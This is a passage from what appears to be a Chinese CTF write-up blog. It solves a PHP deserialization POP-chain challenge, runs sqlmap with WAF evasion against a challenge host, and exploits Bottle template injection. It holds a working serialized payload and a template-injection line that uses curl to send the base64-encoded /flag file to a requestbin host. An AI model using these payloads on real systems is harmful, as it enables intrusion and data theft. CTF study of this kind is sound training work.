class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Warlord</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$fruit4</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$fruit5</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit4</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit5</span><span class="token operator">-&gt;</span><span class="token function">ll2</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'b2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Samurai</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$fruit6</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$fruit7</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$long</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit6</span><span class="token operator">-&gt;</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$long</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit7</span><span class="token operator">-&gt;</span><span class="token property">tt2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"xxx are the best!!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Mystery</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">#__get($property)当访问一个对象的不存在或不可访问的属性时自动调用，传递属性名作为参数。</span>        <span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">,</span> <span class="token variable">$day2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">#array_walk($this, ...) 会遍历当前对象的所有公共属性：PHP 会将对象的公共属性转换为数组形式（键名是属性名，值是属性值）。假设对象有属性name =&gt; "John"，则执行 new name("John")。</span>            <span class="token variable">$day3</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$day2</span><span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$day3</span> <span class="token keyword">as</span> <span class="token variable">$day4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$day4</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Princess</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$fruit9</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">addMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"The time spent with xxx is my happiest time"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit9</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$func</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"Me"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Philosopher</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$fruit10</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$fruit11</span><span class="token operator">=</span><span class="token string double-quoted-string">"sr22kaDugamdwTPhG5zU"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">#__invoke()当将一个对象作为函数进行调用时自动调用。</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit11</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">666</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit10</span><span class="token operator">-&gt;</span><span class="token property">hey</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">UselessTwo</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$hiddenVar</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123123"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hiddenVar</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hiddenVar</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Warrior</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$fruit12</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$fruit13</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit13</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"xxx"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">UselessThree</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$dummyVar</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">UselessFour</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$lalala</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hehe"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'GHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'GHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/cjdgg/article/details/115314651">https://blog.csdn.net/cjdgg/article/details/115314651</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/cd1a5c032745f7599a22cc7988cd0085.png"></p><p>不能说毫不相关，只能说一模一样，<del>还是见识少了（</del></p><p>当时已经将_get前的推出了，但想的是Forbidden传system却又找不到传参的地方。。。</p><p>DirectoryIterator 类<br>FilesystemIterator 类,这俩用<code>glob:///*</code>，用<code>/</code>也行<br>GlobIterator 类各不同吧，但GlobIterator自带glob，用<code>/*</code></p><p>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php<span class="token comment">#CherryBlossom.__destruct()-&gt;CherryBlossom.__toString()-&gt;Philosopher.__invoke()-&gt;Mystery.__get</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CherryBlossom</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$fruit1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$fruit2</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Mystery</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$FilesystemIterator</span><span class="token operator">=</span><span class="token string single-quoted-string">'glob:///*'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Philosopher</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$fruit10</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$fruit11</span><span class="token operator">=</span><span class="token number">213</span><span class="token punctuation">;</span><span class="token comment">#另外我发现这里加不加引号都行，看来'=='是这样的（</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CherryBlossom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CherryBlossom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Philosopher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token operator">-&gt;</span><span class="token property">fruit10</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Mystery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#fruit10而不是11</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#感觉wp里的pop链写法很简单易懂啊，建议大家都这么写（</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token variable">$SplFileObject</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag44545615441084'</span><span class="token punctuation">;</span>`<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"CherryBlossom"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fruit1"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"CherryBlossom"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fruit1"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fruit2"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Philosopher"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fruit10"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Mystery"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"SplFileObject"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"/flag44545615441084"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fruit11"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">213</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fruit2"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得出。</p><hr><h3 id="SQL-（2）"><a href="#SQL-（2）" class="headerlink" title="SQL???（2）"></a>SQL???（2）</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/719df3bea63b944bbb385a9d73944f51.png"></p><p>这个故事告诉我们要看一下错误后的内容，<del>还有要掌握一门外语（</del></p><blockquote><p><code>--random-agent</code> 它的作用是让 SQLMap 在每次向目标网站发送请求时，随机选择一个不同的用户代理（User-Agent）字符串。</p><p>许多 Web 应用防火墙（WAF）会根据用户代理字符串来判断请求是否合法。如果一个来源的请求始终使用相同的用户代理字符串，WAF 可能会将其识别为自动化工具（如 SQLMap）的请求，并进行拦截。而使用 <code>--random-agent</code> 选项后，每次请求的用户代理字符串都不同，模拟了不同用户使用不同浏览器和设备访问网站的情况，从而增加了绕过 WAF 检测的可能性。</p></blockquote><p><code>sqlmap -u "http://node1.anna.nssctf.cn:28030/?id=1" --random-agent </code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8fe07bf64acf321407966ca85d453b0f.png"></p><p><del>但其实能让它扫16分钟的也是神人了</del></p><hr><h3 id="Message-in-a-Bottle"><a href="#Message-in-a-Bottle" class="headerlink" title="Message in a Bottle"></a>Message in a Bottle</h3><p>源代码如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bottle <span class="token keyword">import</span> Bottle<span class="token punctuation">,</span> request<span class="token punctuation">,</span> template<span class="token punctuation">,</span> runapp <span class="token operator">=</span> Bottle<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 存储留言的列表</span>messages <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">handle_message</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    message_items <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"""                    </span><span class="token interpolation"><span class="token punctuation">{</span>msg<span class="token punctuation">}</span></span><span class="token string">            #</span><span class="token interpolation"><span class="token punctuation">{</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string"> - 刚刚            """</span></span> <span class="token keyword">for</span> idx<span class="token punctuation">,</span> msg <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    board <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""                                简约留言板                             :root {{                --primary-color: #4a90e2;                --hover-color: #357abd;                --background-color: #f8f9fa;                --card-background: #ffffff;                --shadow-color: rgba(0, 0, 0, 0.1);            }}            body {{                background: var(--background-color);                min-height: 100vh;                padding: 2rem 0;                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;            }}            .container {{                max-width: 800px;                background: var(--card-background);                border-radius: 15px;                box-shadow: 0 4px 6px var(--shadow-color);                padding: 2rem;                margin-top: 2rem;                animation: fadeIn 0.5s ease-in-out;            }}            @keyframes fadeIn {{                from {{ opacity: 0; transform: translateY(20px); }}                to {{ opacity: 1; transform: translateY(0); }}            }}            .message-card {{                background: var(--card-background);                border-radius: 10px;                padding: 1.5rem;                margin: 1rem 0;                transition: all 0.3s ease;                border-left: 4px solid var(--primary-color);                box-shadow: 0 2px 4px var(--shadow-color);            }}            .message-card:hover {{                transform: translateX(10px);                box-shadow: 0 4px 8px var(--shadow-color);            }}            .message-content {{                font-size: 1.1rem;                color: #333;                line-height: 1.6;                margin-bottom: 0.5rem;            }}            .message-time {{                color: #6c757d;                font-size: 0.9rem;                display: block;                margin-top: 0.5rem;            }}            textarea {{                width: 100%;                height: 120px;                padding: 1rem;                border: 2px solid #e9ecef;                border-radius: 10px;                resize: vertical;                font-size: 1rem;                transition: border-color 0.3s ease;            }}            textarea:focus {{                border-color: var(--primary-color);                outline: none;                box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.1);            }}            .btn-custom {{                background: var(--primary-color);                color: white;                padding: 0.8rem 2rem;                border-radius: 10px;                border: none;                transition: all 0.3s ease;                font-weight: 500;                text-transform: uppercase;                letter-spacing: 0.05rem;            }}            .btn-custom:hover {{                background: var(--hover-color);                transform: translateY(-2px);                box-shadow: 0 4px 8px var(--shadow-color);            }}            h1 {{                color: var(--primary-color);                text-align: center;                margin-bottom: 2rem;                font-weight: 600;                font-size: 2.5rem;                text-shadow: 2px 2px 4px var(--shadow-color);            }}            .btn-danger {{                transition: all 0.3s ease;                padding: 0.6rem 1.5rem;                border-radius: 10px;                text-transform: uppercase;                letter-spacing: 0.05rem;            }}            .btn-danger:hover {{                transform: translateY(-2px);                box-shadow: 0 4px 8px var(--shadow-color);            }}            .text-muted {{                font-style: italic;                color: #6c757d !important;            }}            @media (max-width: 576px) {{                h1 {{                    font-size: 2rem;                }}                .container {{                    padding: 1.5rem;                }}                .message-card {{                    padding: 1rem;                }}            }}                                                     简约留言板                                     一键清理                                                                                            发布留言                                                                            最新留言（</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">条）                    </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token string-interpolation"><span class="token string">f'点击右侧清理按钮可清空列表'</span></span> <span class="token keyword">if</span> message <span class="token keyword">else</span> <span class="token string">''</span><span class="token punctuation">}</span></span><span class="token string">                                </span><span class="token interpolation"><span class="token punctuation">{</span>message_items<span class="token punctuation">}</span></span><span class="token string">                            """</span></span>    <span class="token keyword">return</span> board<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> message<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"{"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> template<span class="token punctuation">(</span>handle_message<span class="token punctuation">(</span>messages<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Clean'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> messages    messages <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">'window.location.href="/"'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/submit'</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'POST'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    message <span class="token operator">=</span> waf<span class="token punctuation">(</span>request<span class="token punctuation">.</span>forms<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    messages<span class="token punctuation">.</span>append<span class="token punctuation">(</span>message<span class="token punctuation">)</span>    <span class="token keyword">return</span> template<span class="token punctuation">(</span>handle_message<span class="token punctuation">(</span>messages<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    run<span class="token punctuation">(</span>app<span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">9000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显的Bottle模版注入，过滤了{和}，尝试闭合标签并写入python代码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>% print<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>div<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>没有回显，但是代码也消失了，判断应该是执行命令但是没有回显</p><p>尝试直接外带数据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>% print<span class="token punctuation">(</span>__import__<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span>.popen<span class="token punctuation">(</span><span class="token string">'curl http://requestbin.cn:80/1lt58m51?data=$(cat /flag | base64)'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">))</span>`<span class="token operator">&lt;</span>div<span class="token operator">&gt;</span><span class="token comment">#使用 